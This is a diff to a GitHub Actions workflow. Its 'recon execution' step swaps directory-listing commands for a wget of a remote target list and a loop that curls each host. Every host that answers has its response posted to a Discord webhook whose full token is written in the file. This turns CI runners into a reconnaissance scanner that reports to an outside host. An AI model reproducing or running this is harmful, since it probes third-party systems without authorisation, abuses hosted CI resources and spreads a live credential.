@@ -13,15 +13,5 @@ jobs:
         sudo apt-get install curl
     - name: recon execution
       run: |
-        ls;
-        echo "-----"
-        cd ../
-        ls
-        echo "-----"
-        cd ../
-        ls
-        echo "-----"
-        cd ../
-        ls
-        echo "-----"
+        wget https://raw.githubusercontent.com/mehrankazemi1122/bio_continues_r3c0n/main/file.txt
         cat file.txt | while read -r line; do response=$(curl -s "http://$line"); [ -n "$response" ] && curl -X POST -d "Response : $response & Target: $line" https://discord.com/api/webhooks/1216775264588005407/KPWsewc6mEFSPesILV8WFDi8eB6SXC6wZ_Inno-_GJU_jQKzSXdp5NX3HAtIuNzZyUEX; done
